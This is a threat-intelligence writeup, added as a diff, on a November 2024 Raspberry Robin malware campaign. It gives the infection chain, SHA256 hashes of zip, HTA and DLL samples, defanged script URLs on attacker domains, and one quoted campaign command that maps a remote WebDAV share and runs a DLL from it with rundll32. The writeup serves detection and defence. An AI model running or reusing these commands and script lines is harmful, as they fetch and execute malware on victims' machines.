@@ -1,0 +1,159 @@
+2024-11-14 (THURSDAY): RASPBERRY ROBIN ACTIVITY
+
+AUTHOR:
+
+- Veronica Senderovych
+
+INFECTION CHAIN:
+
+- Initial zip download --> extracted HTA file --> retrieves/runs script from web server --> script retreives & runs Raspberry Robin DLL from WebDAV server
+
+NOTES:
+
+- We've discovered a distinct pattern for an infection chain distributing Raspberry Robin we can trace back as early as late October 2024.
+- We suspect the initial zip downloads are distributed through embedded third-party ads on various sites trying to monetize traffic.
+- These zip archives and extracted HTA files all have the same root name.  Examples are:
+  -- access.zip --> access.hta
+  -- bootstrap.zip --> bootstrap.hta
+  -- bundle.zip --> bundle.hta
+  -- min.zip --> min.hta
+- The extracted HTA files contain hundreds or thousands of spaces and include a single line to run script hosted on a publicly-accessible URL.
+- The URL returns obfuscated script to retrieve and run a Raspberry Robin DLL hosted on a WebDAV server.
+- The script hosted on these publicly-accessible URL changes periodically, indicating that different WebDAV servers have been used for this campaign.
+- The WebDAV server has a new Raspberry Robin DLL approximately every 50 minutes using the same name, but a different size and file hash.
+- Testing some of these DLL files generated Tor-based C2 traffic, which is expected for Raspberry Robin.
+- For more information on Raspberry Robin, see:
+  -- https://redcanary.com/blog/threat-intelligence/raspberry-robin/
+
+27 EXAMPLES OF ZIP ARCHIVES:
+
+(READ: SHA256 hash - file size -- modified date -- file name)
+
+ddb00e38a4a631eec4d1b93e25abeed6f205e5dc58f7582855b16766c8773f90 - 207 bytes - 2024/11/14 - min.zip
+3b0405812ebff740f4e9f4e0982530be7f579ab56141dc5225340ea2f23771f3 - 199 bytes - 2024/11/13 - min.zip
+ff96c9ac5b324666a572ae09d8a63640f754d0674f9b65af32a2c097a866379d - 197 bytes - 2024/11/13 - min.zip
+39c242b395b48c08a1381d2ccf401138875e527eb542218d43701ac87218b5bb - 199 bytes - 2024/11/12 - min.zip
+8795784522ae18bdd68e2a9b888b6eab796d217df9a5c182f7619b6ac4dd34be - 214 bytes - 2024/11/09 - min.zip
+71cfb41f7eccb9fc1bb3c34605d6f7fdfd4deb666fdb6ba17a52d2f9246ebc5b - 211 bytes - 2024/11/09 - min.zip
+21c080be9be3bf451409d235e353bf685b6f76bd23542b7c2f668d7ccac4c2f5 - 209 bytes - 2024/11/08 - min.zip
+ea8de0a0ed69c47cd36b81143228a7da7dee4984ca27e5e825ea5d98d53709a0 - 209 bytes - 2024/11/08 - min.zip
+60c9fdbe0dbb4d90208e79367350bbdc4963917f92dedfb1cff9b8085efcd3f7 - 208 bytes - 2024/11/08 - min.zip
+04f4b870559377b3e8779aaa3f196e4422817c6229fc1010451389a33a7260ef - 194 bytes - 2024/11/07 - min.zip
+64149b1f0d8080814a3331681fe2b7223f13f96a901cec21c3536aaa5b88172f - 201 bytes - 2024/11/07 - min.zip
+9ba35009b7c9b9e7cf9a7f86f1186ccd24d88db986d23ee8524c1afeca829d55 - 192 bytes - 2024/11/07 - min.zip
+cd832501cf86a6e9593a77510a7e8ac101a3003bfe82332ae0eaa820a4d6cc6b - 189 bytes - 2024/11/07 - min.zip
+e4c7cc35bceb71cc80ab2805e94738fe72996b299bab3973cfd1b0911556c58e - 195 bytes - 2024/11/07 - min.zip
+f2cf2059470fa8789190cac28dfaffd61c47f79395956276becf0ce2a8e82924 - 202 bytes - 2024/11/06 - min.zip
+36a2eddf919e240798b7a7b63c36b4b13ee870d6443649526879197ce4ac7fe2 - 198 bytes - 2024/11/06 - min.zip
+5d68a7d6e39e0fd185e487645576215595f24e5dc85d7cd250ecc44a2eba636a - 201 bytes - 2024/11/04 - min.zip
+df1bc77820e254ce981436baad7f492ac6959d92374a425b3a62b19350405ef3 - 200 bytes - 2024/11/05 - min.zip
+4b9ecd97d43cc2b60f73982291d93b5d4790e62c48585e377c088102385dc833 - 205 bytes - 2024/11/05 - min.zip
+d1e84ce06ca0e8798dbbf8f01b900d3e888ed618c9da76568fd67024e6163e2c - 206 bytes - 2024/11/04 - min.zip
+b42678d3cb8f62ebdb8d66eb3849728ad5fc3c05d85006208d2c794ca43f6f5f - 203 bytes - 2024/11/03 - min.zip
+fc353c9fcd9015bbbad598a2172faed16d031d21f4cb2d532c91fd228af68747 - 203 bytes - 2024/11/03 - min.zip
+717c187776f08f5543919c22b9665d5b4e3308cedab832a118b8b4d0e44ed027 - 202 bytes - 2024/11/02 - min.zip
+4fc9b963d4e64d6de95712eb9d0ea08609c1615744e17892efae5fb8edff4001 - 185 bytes - 2024/11/02 - min.zip
+564a96a011450594d122ecf63e6233fe9e1113ca469c3c6a8d2ed449df922b45 - 199 bytes - 2024/11/02 - min.zip
+e65c294df002c06335b245ddc66b8ce1bbd314c373852f3b773c4370ef062f8b - 193 bytes - 2024/11/01 - min.zip
+e857b1966bdaa47ab1899dc3a9161cc9e86338c6d5f200fbe4349ce4157b08dc - 207 bytes - 2024/11/01 - min.zip
+
+27 EXTRACTED HTA FILES FROM THE ABOVE ZIP ARCHIVES:
+
+(READ: SHA256 hash - file size -- modified date -- file name)
+
+cbd4f7d63ad6f6ee61ea7e183ee532f0446afe6ea54c8757fc00a858145b3a0e - 3,542 bytes - 2024/11/14 - min.hta
+a975ec328be2affaf087eb527f654b2836b81942c7fcb978ad748e3eb6b31675 - 1,818 bytes - 2024/11/13 - min.hta
+e070ae4b651976933fca500e88e6e0316ddc3e30d6e5061845d935f91a33f81c - 2,299 bytes - 2024/11/12 - min.hta
+b69144a0b34175d32e5e2d96521ea2931a89f17396d2aaa55c95036122a33b34 - 3,583 bytes - 2024/11/09 - min.hta
+deb13461f1dad78feb8cba3670e1cd3205d5b4b656944a5bb3bbe7d3ab022420 - 2,614 bytes - 2024/11/09 - min.hta
+0f79e1d4179d5211c624d9b0ca51cb4387c95072c83f3af036fe874568dd73c1 - 1,553 bytes - 2024/11/08 - min.hta
+63a79c809a91226875a3bc7565c096932bda8051d971417a764c1e2a538afff2 - 1,673 bytes - 2024/11/08 - min.hta
+b84b23a0d996ab9ea7257321f4c0994a8910a3b5fae58abee770abee9463dbfe - 2,008 bytes - 2024/11/08 - min.hta
+24e802cb977c8184767c8ed3d4cc7a30feea14cb2459425dc66bbb9cd8b4ab4f -   469 bytes - 2024/11/07 - min.hta
+4a5c8f258bbdfc2cd40bb712caede4328a273c2d38ef0d337138de7e07c62dcb -   837 bytes - 2024/11/07 - min.hta
+98c17f2251e7d5330a54f465e7c371b48611d5e0f8ffcb9a0805808b85dc56d1 - 1,162 bytes - 2024/11/07 - min.hta
+9eaeb05d761bc255c68043a20f888b2e1a8a0df4048ad8e5d77e2f81d051e7e1 - 1,541 bytes - 2024/11/07 - min.hta
+d941dba96951b0ddef4a8496919c77aba7d6bb99ca2152886170e88ac7829796 - 3,365 bytes - 2024/11/07 - min.hta
+07dc361a2b8a1ef4894d3b96103703498c50208a35e12892a367d283c2e38d8e - 2,671 bytes - 2024/11/06 - min.hta
+5acd8a29b80a904e4dd11055009b4c5f77ba129b926d9a73c31ddd4d3e44ca89 - 1,774 bytes - 2024/11/06 - min.hta
+867087f7147c70729d5acf4798f9d8bdefa1f77a9cebeb5adf439dcb48520521 - 2,445 bytes - 2024/11/05 - min.hta
+d279d9289a26f604a697cd3bc381d2114163d67b45c206bb5fa601f1fa285c8b - 2,086 bytes - 2024/11/05 - min.hta
+9ef4e8e57a33bf2561236e3c4260c8b820d6fe708f643803a11e4bad8c153e62 - 2,362 bytes - 2024/11/04 - min.hta
+360c53a4f79d4c7a9332d5a40eaefbaef0be0861fb50ea55f22f34e582a80055 - 2,952 bytes - 2024/11/04 - min.hta
+4d9faf2ab8a5032d23b17928072409808b64b76830b77302009d35b0e7141766 - 2,713 bytes - 2024/11/03 - min.hta
+fd8a9f84a2ffdf90a8e1651530a47f9e8ba1b7f683f6ffc101b0859b29c6b935 - 2,101 bytes - 2024/11/03 - min.hta
+18225fdc3b1766b90d926de5ad71de5601f1634b6b2656f8aa0dbedc7c97428c - 2,122 bytes - 2024/11/02 - min.hta
+2462b8785e1712b1cbfed094def6c96a73cb1dc1cac8e9f247b091431e208698 - 3,093 bytes - 2024/11/02 - min.hta
+3475476875510cfcf82fcec2713f5308c7a25dce42208be05a8772450bd711fe -   326 bytes - 2024/11/02 - min.hta
+918ce4d505e6af7b98d9ead762f4053d196c00a4fb7c25c2285c57c3f033c369 - 3,434 bytes - 2024/11/01 - min.hta
+e7848c2693e35d136a01bb04a91452e6a7a6e2526ef347d14fd601d8bd78108f - 1,119 bytes - 2024/11/01 - min.hta
+
+27 LINES OF SCRIPT FROM THE ABOVE HTA FILES:
+
+<script src="hxxp[:]//ae2bc3bf.bright-witted[.]skin/2f6mlq45pn3u9"></script>
+<script src="hxxp[:]//39eacf27.concurrences[.]makeup/3vdl1kg5fv49e"></script>
+<script src="hxxp[:]//aee0f533.deoppilant[.]monster/26tgtvr5f3it6"></script>
+<script src="hxxp[:]//bff7ca72.deoppilant[.]monster/1n1mr3l5f621i"></script>
+<script src="hxxp[:]//76f2f947.dogtrotted[.]cyou/2q8a1p459eu4o"></script>
+<script src="hxxp[:]//5b20be63.free-handedness[.]yachts/3chr6ho5akd2r"></script>
+<script src="hxxp[:]//7fd6f7f7.luminosity[.]lol/30uakkj5ff50g"></script>
+<script src="hxxp[:]//add1acc4.luminosity[.]lol/oiok1v5feihp"></script>
+<script src="hxxp[:]//24306d7b.malalignment[.]bond/8oohbu5b67ae"></script>
+<script src="hxxp[:]//555248d6.noncancerous[.]beauty/1a2jjo15b9ua9"></script>
+<script src="hxxp[:]//9d5d9876.rhinophidae[.]bond/18flme75dov33"></script>
+<script src="hxxp[:]//80910c15.simple-life[.]lol/1e9en94560uac"></script>
+<script src="hxxp[:]//b896c64b.simple-life[.]lol/11ela4054hp82"></script>
+<script src="hxxp[:]//d0fddb88.simple-life[.]lol/3blnmuc54vlkl"></script>
+<script src="hxxp[:]//eb175142.simple-life[.]lol/2ukgtfq54coru"></script>
+<script src="hxxp[:]//7c7eb2e6.sulphamidic[.]mom/39ojo545fp2r3"></script>
+<script src="hxxp[:]//1ba7e0c7.summer-breathing[.]motorcycles/3nf1gn95hmt0i"></script>
+<script src="hxxp[:]//52a124a7.summer-breathing[.]motorcycles/j8unnt5hqm8j"></script>
+<script src="hxxp[:]//a570fa56.summer-breathing[.]motorcycles/2nlvm745j3fe8"></script>
+<script src="hxxp[:]//c7e3e877.summer-breathing[.]motorcycles/r26np85j3nn3"></script>
+<script src="hxxp[:]//f3612111.summer-breathing[.]motorcycles/2nigjnv5i8q39"></script>
+<script src="hxxp[:]//c47fabc0.superaccumulate[.]mom/32efsui57agee"></script>
+<script src="hxxp[:]//312fe387.unfoolishly[.]christmas/14tm67d53r7on"></script>
+<script src="hxxp[:]//9973914b.uteromaniacal[.]makeup/1hvl3o3586u9t"></script>
+<script src="hxxp[:]//11355b83.viticulture[.]rest/e015865mctbb"></script>
+<script src="hxxp[:]//2c64bb87.viticulture[.]rest/7rchv15l7viv"></script>
+<script src="hxxp[:]//a74a8d08.viticulture[.]rest/279oaip5mtpre"></script>
+
+EXAMPLE OF COMMANDS FROM THE SCRIPT RETURNED FROM ONE OF THE ABOVE URLS ON 2024-11-14:
+
+"C:\Windows\System32\cmd.exe" /c net use W: \\2z[.]si@ssl\u && C:\WINDOWS\system32\rundll32 W:\i\v.dll,%random%%random%
+
+22 EXAMPLES OF DOWNLOADED DLL FOR RASPBERRY ROBIN FROM 2024-11-01 through 2024-11-13: 
+
+1e4b800bb8bacff6a1c97581c54bb1d138ef158f51e0ac0d787062ae08742c82 - 2,015,232 bytes
+25d061da51f6e39442d95bb1a2b803ba008565673a22a566b5dadccefb84b460 - 2,248,704 bytes
+2637651673703297c4506de4e76f8cb48cb56ab1a3a4cf91f60b3339b3ddebde - 2,019,328 bytes
+2c092a17510f152a58160960aa9eae1a2b4780a6bc3bc976bc2358871ac9a3c1 - 2,011,136 bytes
+3e59283c8fdb71804112d0b94c33da832b2a5501c9b9c682af87359931fe403e - 3,387,392 bytes
+41b779193a5eff41c1d03809720b885f351cc77b351c7462364170cd9e57141a - 2,244,608 bytes
+533f2fe7c9eca0137490b6da36a5c3e43f925bb2386d9b3262c3b57332366af3 - 2,019,328 bytes
+5557b0f841e82cc62889812dbd26a8ef7cb0e33be71e0e83308eec3e3ee8e21e - 2,248,704 bytes
+65f4354374df9ddeaeed9413625c1e6da0c60718eb7dfd75a2012fe5dcb6abaa - 3,391,488 bytes
+661808e28d754a401f2ca989b02870bc21eb9a555cd561d9ba04380d667f169c - 2,236,416 bytes
+737a668855f6eb06ac05c52f3d35fa8fbca6faa6bc374c040b5e57865b754692 - 2,244,608 bytes
+9a6d0bdf69ce674b5b420a0928575661362b2889603eec0cfcb3a270c6f310a8 - 2,019,328 bytes
+a5ac4765d56c474d24ae9a07b36c8d576bb39935ad8a5c6051d59817348d3c28 - 3,387,392 bytes
+a953e4b08e009f55131a7c9186822683715db3b4a56a0b90f30d11e0a18bf51c - 2,240,512 bytes
+ab3b696bf05799d2ae210750d542f52c25a713c06cd0ff16a8e8dc10ec9a29fa - 3,387,392 bytes
+b5b181db5c586815e35389212412dc37978c62e2571b4240c5cf69d0040e84e9 - 3,387,392 bytes
+bd6834d7194d66730ee1d2634d095189da5defcb7c85c7bf02dcd43d445e8564 - 2,011,136 bytes
+eb4b227288466dc0856f6e59e459029cace7541f33217b23f4ce32056e281c39 - 2,244,608 bytes
+edc9cd029dd34b4bb3fd54ccb0ea46c6796dbd7ba396ebd7da2dd380d5bb0eb1 - 3,387,392 bytes
+efce1d0623439f51836b7e9d87234edbf91e2e8993bbc06edc9fffed7cb8f807 - 2,240,512 bytes
+f3cc817c7d8904f54677f6896d8155fcc725ee92caf73f425edf65fddc63951f - 2,019,328 bytes
+fc95bcf7c07bac86e4432521b24af4301a57a885819d40c44a8a882394b4b744 - 2,244,608 bytes
+
+2 ADDITIONAL EXAMPLES OF THE DLL SEEN ON 2024-11-14:
+
+(Read: SHA256 hash - file size - modified/saved date from WebDAV server)
+
+346f58c8f48c748f8354d5c98c74fb5ce8e3165bfcca3ffff9f73c712d779e77 - 2,748,416 bytes - 2024/11/14 16:40 UTC
+a8939f986c939f1d87dc77c2d1c82cb0963dc568e87e22305c758c4a6f77f619 - 2,203,648 bytes - 2024/11/14 15:50 UTC
+
+RUN METHOD FOR THE ABOVE DLL FILES:
+
+rundll32 [filename],%random%%random%
